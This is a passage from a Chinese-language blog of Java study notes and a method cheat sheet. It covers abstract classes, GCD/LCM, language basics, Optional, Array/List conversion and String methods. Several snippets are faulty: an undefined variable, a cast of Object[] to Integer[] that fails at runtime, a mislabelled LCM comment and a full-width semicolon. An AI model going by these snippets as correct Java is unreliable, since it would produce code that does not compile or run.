class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">tuxing</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">tuxing</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        chang = a;</span><br><span class="line">        kuan = b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> chang;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> kuan;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">int</span> <span class="title">mianji</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">int</span> <span class="title">zhouchang</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">juxing</span> <span class="keyword">extends</span> <span class="title">tuxing</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">juxing</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(a, b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">mianji</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> chang * kuan;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">zhouchang</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> chang * <span class="number">2</span> + kuan * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        juxing juxing1 = <span class="keyword">new</span> juxing(<span class="number">10</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">int</span> mianji = juxing1.mianji();</span><br><span class="line">        <span class="keyword">int</span> zhouchang = juxing1.zhouchang();</span><br><span class="line">        System.out.println(zhouchang);</span><br><span class="line">        System.out.println(mianji);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>键盘输入两个数字,加减乘除,求最大公因数最小公倍数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> m = scanner.nextInt();</span><br><span class="line">        <span class="keyword">int</span> n = scanner.nextInt();</span><br><span class="line">        <span class="keyword">int</span> a = m;</span><br><span class="line">        <span class="keyword">int</span> b = n;</span><br><span class="line">        <span class="comment">//求最大公因数最小公倍数.</span></span><br><span class="line">        <span class="keyword">if</span> (m &lt; n) &#123;<span class="comment">// 保证m&gt;n,若m&lt;n,则进行数据交换</span></span><br><span class="line"><span class="keyword">int</span> temp = m;</span><br><span class="line">m = n;</span><br><span class="line">n = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (m % n != <span class="number">0</span>) &#123;<span class="comment">// 在余数不能为0时,进行循环</span></span><br><span class="line"><span class="keyword">int</span> temp = m % n;</span><br><span class="line">m = n;</span><br><span class="line">n = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> gongyueshu = n;<span class="comment">// 返回最大公约数</span></span><br><span class="line">        <span class="keyword">int</span> gongbeishu = a*b/n; <span class="comment">//最大公倍数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20210115194605124.png" alt="image-20210115194605124"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20210115194645581.png" alt="image-20210115194645581"></p><blockquote><p><strong>剩下的是我自己原来随便写的, 不用看</strong></p></blockquote><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><blockquote><p>不多说了，主要说一下容易错的几个点。</p></blockquote><p>局部变量在使用前必须给定初值，否则编译出错，类成员变量无此要求。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20210107193030149.png" alt="image-20210107193030149"></p><p>注意Java中局部变量的作用域在它的代码块中。</p><p>类静态成员常量只能在定义时初始化</p><p>方法中的常量(局部常量)可以在定义时初始化，也可以先定义，后初始化</p><p>常量只能赋值一次(初始化)</p><p>整形默认是int，浮点型默认时double</p><p>科学计数法：2.&lt;尾数&gt; E &lt;阶码&gt; </p><p>   <strong>-1.234567E+12</strong>  </p><p>尾数必须有，但小数部分可无</p><p>阶码必须有，必须是整数</p><p>基数是10</p><p><code>Infinity，-Infinity，NaN</code></p><p><code>instanceof</code>用来确定一对象是否是某一指定类的对象父类也返回true</p><p>&amp;&amp; 和 || 短路，&amp;|不断路</p><p>&gt;&gt;右移，左边填充符号位</p><p>&lt;&lt;左移，右边填充0</p><p>&gt;&gt;&gt;无符号右移，左边填充0</p><p>运算符优先级。。但愿不会出谭浩强的题目</p><p>自动类型转换：低精度转高精度</p><p>强制类型转换：<code>int a=345;byte b = (byte)a;</code>//可能导致精度丢失</p><p><code>int</code>常量赋给合适精度的变量不需要强制转换，但是<code>int</code>变量赋值给精度低的变量就需要强制类型转换了</p><p><code>Arrays.sort(x);</code>//排序 </p><p><code>Arrays.binarySearch(x,1)</code> //二分查找，</p><p><code>System.arraycopy(x,0,y,0,length)</code> //拷贝</p><p><code>Arrays.fill(x,7);</code>//使用特定值填充</p><h2 id="OOP"><a href="#OOP" class="headerlink" title="OOP"></a>OOP</h2><p>final static 修饰 必须在定义的时候赋值</p><p>final 变量 可以在构造函数中赋值</p><p>final 修饰类, 不能被继承, 修饰方法, 不能被覆写, 一般final类和private方法都默认是final的</p><p>static 静态成员变量为所有子类和父类共享</p><p>static 可以被子类覆写, 两个变量相互独立, 互不影响</p><p>普通变量 也可以被子类覆写, 两个变量相互独立, 不影响, 也就是隐藏机制</p><p>子类覆写的变量或方法不可以降低成员的访问权限</p><p>子类调用父类构造方法使用super()并且必须放在第一句</p><p>如果子类没有显示的调用父类的构造方法, 则默认在子类构造方法前调用父类的无参构造方法, 如果父类没有super()就会报错. </p><p>构造方法调用顺序</p><ul><li>首先调用父类的构造方法, 这个过程会被反复递归调用, 直到调用完全部父类的构造方法. </li><li>对成员变量进行初始化赋值,</li><li>最后执行该类的构造方法</li></ul><p>静态代码块先于代码块和属性初始化，代码块先于构造方法。 静态属性初始化和静态代码块哪个在前面哪个先。 同样属性初始化和代码块哪个在前面哪个先。 静态属性初始化先于普通属性初始化。</p><p>abstract 修饰抽象类/抽象方法</p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>接口中的变量都是 public static final的</p><p>接口中的方法都是public abstract , 可以省略不写.</p><h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><p><a href="https://www.cnblogs.com/fuao2000/p/14266735.html" target="_blank" rel="noopener">https://www.cnblogs.com/fuao2000/p/14266735.html</a></p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><ol><li>错误error</li><li>异常exception<ul><li>运行时异常(程序本身的错误, 程序员可以修改程序来避免)</li><li>非运行时异常(可以由编译器在编译的时候检测到的, 发生在方法执行过程中的异常, 必须捕获或者抛出这种异常)</li></ul></li></ol><h2 id="util-and-io包"><a href="#util-and-io包" class="headerlink" title="util and io包"></a>util and io包</h2><p><code>String</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">substring();<span class="comment">//返回字串</span></span><br><span class="line"></span><br><span class="line">length()</span><br><span class="line"></span><br><span class="line">charAt()</span><br><span class="line"></span><br><span class="line">tocharArray()</span><br><span class="line"></span><br><span class="line">toUpperCase()</span><br><span class="line"></span><br><span class="line">toLowerCase()</span><br></pre></td></tr></table></figure><p><code>StringBuffer</code>  //线程安全</p><p><code>StringBuilder</code> //非线程同步的类, 速度比StringBuffer快</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">append()</span><br><span class="line"></span><br><span class="line">insert()</span><br><span class="line"></span><br><span class="line">setCharAt()</span><br><span class="line"></span><br><span class="line">delete()</span><br></pre></td></tr></table></figure><p><code>Calendar</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取</span></span><br><span class="line">Calendar c = Calendar.getInstance();</span><br><span class="line">set()</span><br><span class="line">gettime()</span><br></pre></td></tr></table></figure><p><code>DateFormat</code>//格式化日期</p><p>流的概念:</p><p>分为输入流, 输出流, 字符流, 字节流, 节点流, 过滤流</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>InputStream</td><td>字节输入流的超类</td></tr><tr><td>OutputStream</td><td>字节输出流的超类</td></tr><tr><td>Reader</td><td>字符输入流的超类</td></tr><tr><td>Writer</td><td>字符输出流的超类</td></tr><tr><td>File</td><td>文件类</td></tr><tr><td>RandomAccessFile</td><td>随机访问文件类</td></tr></tbody></table><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p><a href="https://www.cnblogs.com/fuao2000/p/14272827.html" target="_blank" rel="noopener">https://www.cnblogs.com/fuao2000/p/14272827.html</a></p><h2 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h2><p>暂时不写了. </p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p><a href="https://www.cnblogs.com/fuao2000/p/14181645.html" target="_blank" rel="noopener">https://www.cnblogs.com/fuao2000/p/14181645.html</a></p><h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><p><a href="https://www.cnblogs.com/fuao2000/p/14169874.html" target="_blank" rel="noopener">https://www.cnblogs.com/fuao2000/p/14169874.html</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java方法小抄</title>
      <link href="/2020/12/16/java_method/"/>
      <url>/2020/12/16/java_method/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Java方法记录</p></blockquote><a id="more"></a><h2 id="Array和List相互转化"><a href="#Array和List相互转化" class="headerlink" title="Array和List相互转化"></a>Array和List相互转化</h2><h3 id="Arrays-asList把数组转化成List"><a href="#Arrays-asList把数组转化成List" class="headerlink" title="Arrays.asList把数组转化成List"></a><code>Arrays.asList</code>把数组转化成List</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">把数组转化成list</span></span><br><span class="line"><span class="comment">注意asList 方法的参数必须是对象或者对象数组，而原生数据类型不是对象</span></span><br><span class="line"><span class="comment">转化int 数组需要变成Integer</span></span><br><span class="line"><span class="comment">返回一个由指定数组生成的**固定大小**的 List。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">String[] myArray = &#123; <span class="string">"Apple"</span>, <span class="string">"Banana"</span>, <span class="string">"Orange"</span> &#125;； </span><br><span class="line">List&lt;String&gt; myList = Arrays.asList(myArray);</span><br><span class="line">List&lt;String&gt; myList = Arrays.asList(<span class="string">"Apple"</span>, <span class="string">"Orange"</span>);</span><br><span class="line">Integer[] myArray = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;;</span><br><span class="line">List&lt;Integer&gt; myList = Arrays.asList(myArray);</span><br><span class="line"><span class="comment">//得到可以修改大小的ArrayList</span></span><br><span class="line">String[] myArray = &#123; <span class="string">"Apple"</span>, <span class="string">"Banana"</span>, <span class="string">"Orange"</span> &#125;;</span><br><span class="line">List&lt;String&gt; myList = <span class="keyword">new</span> ArrayList&lt;String&gt;(Arrays.asList(myArray));</span><br></pre></td></tr></table></figure><h3 id="ArrayList-toArray-T-arr-把list转化成数组"><a href="#ArrayList-toArray-T-arr-把list转化成数组" class="headerlink" title="ArrayList.toArray(T[] arr) 把list转化成数组"></a>ArrayList.toArray(T[] arr) 把list转化成数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 方法一：</span></span><br><span class="line"><span class="comment"> * Type[] l = new Type[&lt;total size&gt;];</span></span><br><span class="line"><span class="comment"> * list.toArray(l);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> Integer[] arr = <span class="keyword">new</span> Integer[list.size()];</span><br><span class="line"> list.toArray(a);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 方法二：</span></span><br><span class="line"><span class="comment"> * Type[] l = (Long []) list.toArray(new Type[0]);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> arr = list.toArray(<span class="keyword">new</span> Integer[<span class="number">0</span>]);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 方法三：</span></span><br><span class="line"><span class="comment"> * a = list.toArray((Type[]) new Object[list.size()]);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> arr = list.toArray((Integer[]) <span class="keyword">new</span> Object[list.size()]);</span><br></pre></td></tr></table></figure><h2 id="Optional判断Object是否为空"><a href="#Optional判断Object是否为空" class="headerlink" title="Optional判断Object是否为空"></a><code>Optional</code>判断Object是否为空</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/******************************************************************************/</span></span><br><span class="line"><span class="keyword">import</span> java.util.Optional&lt;T&gt;;</span><br><span class="line">Optional&lt;String&gt; emptyOpt = Optional.empty();<span class="comment">//初始化为空</span></span><br><span class="line">Optional&lt;String&gt; notNullOpt = Optional.of(str);<span class="comment">//初始化不为空</span></span><br><span class="line">Optional&lt;String&gt; nullableOpt = Optional.ofNullable(str);<span class="comment">//初始化可以为空</span></span><br><span class="line">emptyOpt.isPresent();<span class="comment">//如果为空返回false，不为空返回true。</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">orElse()：如果有值就返回，否则返回一个给定的值作为默认值；</span></span><br><span class="line"><span class="comment">orElseGet()：与orElse()方法作用类似，区别在于生成默认值的方式不同。该方法接受一个Supplier&lt;? extends T&gt;函数式接口参数，用于生成默认值；</span></span><br><span class="line"><span class="comment">orElseThrow()：与前面介绍的get()方法类似，当值为null时调用这两个方法都会抛出NullPointerException异常，区别在于该方法可以指定抛出的异常类型。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">String str = <span class="string">"Hello World"</span>;</span><br><span class="line">Optional&lt;String&gt; strOpt = Optional.of(str);</span><br><span class="line">String orElseResult = strOpt.orElse(<span class="string">"Hello Shanghai"</span>);</span><br><span class="line">String orElseGet = strOpt.orElseGet(() -&gt; <span class="string">"Hello Shanghai"</span>);</span><br><span class="line">String orElseThrow = strOpt.orElseThrow(</span><br><span class="line">        () -&gt; <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Argument 'str' cannot be null or blank."</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">在下面的代码中，如果filter()方法中的Lambda表达式成立，filter()方法会返回当前Optional对象值，否则，返回一个值为空的Optional对象。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Optional&lt;String&gt; optional = Optional.of(<span class="string">"lw900925@163.com"</span>);</span><br><span class="line">optional = optional.filter(str -&gt; str.contains(<span class="string">"164"</span>));</span><br></pre></td></tr></table></figure><p>上面提到创建<code>Optional</code>对象有三个方法，<code>empty()</code>方法比较简单，没什么特别要说明的。主要是<code>of()</code>和<code>ofNullable()</code>方法。当你很确定一个对象不可能为<code>null</code>的时候，应该使用<code>of()</code>方法，否则，尽可能使用<code>ofNullable()</code>方法，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">(Role role)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 当Optional的值通过常量获得或者通过关键字new初始化，可以直接使用of()方法</span></span><br><span class="line">    Optional&lt;String&gt; strOpt = Optional.of(<span class="string">"Hello World"</span>);</span><br><span class="line">    Optional&lt;User&gt; userOpt = Optional.of(<span class="keyword">new</span> User());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法参数中role值不确定是否为null，使用ofNullable()方法创建</span></span><br><span class="line">    Optional&lt;Role&gt; roleOpt = Optional.ofNullable(role);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="orElse-方法的使用"><a href="#orElse-方法的使用" class="headerlink" title="orElse()方法的使用"></a><code>orElse()</code>方法的使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> str != <span class="keyword">null</span> ? str : <span class="string">"Hello World"</span></span><br></pre></td></tr></table></figure><p>上面的代码表示判断字符串<code>str</code>是否为空，不为空就返回，否则，返回一个常量。使用<code>Optional</code>类可以表示为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> strOpt.orElse(<span class="string">"Hello World"</span>)</span><br></pre></td></tr></table></figure><h3 id="简化if-else"><a href="#简化if-else" class="headerlink" title="简化if-else"></a>简化<code>if-else</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">User user = ...</span><br><span class="line"><span class="keyword">if</span> (user != <span class="keyword">null</span>) &#123;</span><br><span class="line">    String userName = user.getUserName();</span><br><span class="line">    <span class="keyword">if</span> (userName != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> userName.toUpperCase();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码可以简化成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User user = ...</span><br><span class="line">Optional&lt;User&gt; userOpt = Optional.ofNullable(user);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> userOpt.map(User::getUserName)</span><br><span class="line">            .map(String::toUpperCase)</span><br><span class="line">            .orElse(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><h2 id="String"><a href="#String" class="headerlink" title="String"></a>String</h2><h3 id="trim-删除头尾空格"><a href="#trim-删除头尾空格" class="headerlink" title="trim() 删除头尾空格"></a>trim() 删除头尾空格</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String Str = <span class="keyword">new</span> String(<span class="string">"    www.runoob.com    "</span>);</span><br><span class="line">        System.out.print(<span class="string">"原始值 :"</span> );</span><br><span class="line">        System.out.println( Str );</span><br><span class="line"></span><br><span class="line">        System.out.print(<span class="string">"删除头尾空白 :"</span> );</span><br><span class="line">        System.out.println( Str.trim() );</span><br></pre></td></tr></table></figure><h3 id="split-根据正则表达式拆分字符串"><a href="#split-根据正则表达式拆分字符串" class="headerlink" title="split() 根据正则表达式拆分字符串"></a>split() 根据正则表达式拆分字符串</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] split(String regex, <span class="keyword">int</span> limit);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">regex -- 正则表达式分隔符。</span></span><br><span class="line"><span class="comment">limit -- 分割的份数。</span></span><br><span class="line"><span class="comment">返回字符串数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">String str = <span class="keyword">new</span> String(<span class="string">"Welcome-to-Runoob"</span>);</span><br><span class="line">    System.out.println(<span class="string">"- 分隔符返回值 :"</span> );</span><br><span class="line">    <span class="keyword">for</span> (String retval: str.split(<span class="string">"-"</span>))&#123;</span><br><span class="line">        System.out.println(retval);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">""</span>);</span><br><span class="line">    System.out.println(<span class="string">"- 分隔符设置分割份数返回值 :"</span> );</span><br><span class="line">    <span class="keyword">for</span> (String retval: str.split(<span class="string">"-"</span>, <span class="number">2</span>))&#123;</span><br><span class="line">        System.out.println(retval);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">""</span>);</span><br><span class="line">    String str2 = <span class="keyword">new</span> String(<span class="string">"www.runoob.com"</span>);</span><br><span class="line">    System.out.println(<span class="string">"转义字符返回值 :"</span> );</span><br><span class="line">    <span class="keyword">for</span> (String retval: str2.split(<span class="string">"\\."</span>, <span class="number">3</span>))&#123;</span><br><span class="line">        System.out.println(retval);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">""</span>);</span><br><span class="line">    String str3 = <span class="keyword">new</span> String(<span class="string">"acount=? and uu =? or n=?"</span>);</span><br><span class="line">    System.out.println(<span class="string">"多个分隔符返回值 :"</span> );</span><br><span class="line">    <span class="keyword">for</span> (String retval: str3.split(<span class="string">"and|or"</span>))&#123;</span><br><span class="line">        System.out.println(retval);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="public-char-toCharArray-转化成char数组"><a href="#public-char-toCharArray-转化成char数组" class="headerlink" title="public char[] toCharArray() 转化成char数组"></a>public char[] toCharArray() 转化成char数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String Str = <span class="keyword">new</span> String(<span class="string">"www.runoob.com"</span>);</span><br><span class="line">        System.out.print(<span class="string">"返回值 :"</span> );</span><br><span class="line">        System.out.println( Str.toCharArray() );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="indexOf-查找指定字符串在字符串的下标"><a href="#indexOf-查找指定字符串在字符串的下标" class="headerlink" title="indexOf() 查找指定字符串在字符串的下标"></a>indexOf() 查找指定字符串在字符串的下标</h3><p>indexOf() 方法有以下四种形式：</p><ul><li><p><strong>public int indexOf(int ch):</strong> 返回指定字符在字符串中第一次出现处的索引，如果此字符串中没有这样的字符，则返回 -1。</p></li><li><p><strong>public int indexOf(int ch, int fromIndex):</strong> 返回从 fromIndex 位置开始查找指定字符在字符串中第一次出现处的索引，如果此字符串中没有这样的字符，则返回 -1。</p></li><li><p><strong>int indexOf(String str):</strong> 返回指定字符在字符串中第一次出现处的索引，如果此字符串中没有这样的字符，则返回 -1。</p></li><li><p><strong>int indexOf(String str, int fromIndex):</strong> 返回从 fromIndex 位置开始查找指定字符在字符串中第一次出现处的索引，如果此字符串中没有这样的字符，则返回 -1。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">String string = <span class="string">"aaa456ac"</span>;  </span><br><span class="line">    <span class="comment">//查找指定字符是在字符串中的下标。在则返回所在字符串下标；不在则返回-1.  </span></span><br><span class="line">    System.out.println(string.indexOf(<span class="string">"b"</span>)); <span class="comment">// indexOf(String str); 返回结果：-1，"b"不存在  </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从第四个字符位置开始往后继续查找，包含当前位置  </span></span><br><span class="line">    System.out.println(string.indexOf(<span class="string">"a"</span>,<span class="number">3</span>));<span class="comment">//indexOf(String str, int fromIndex); 返回结果：6  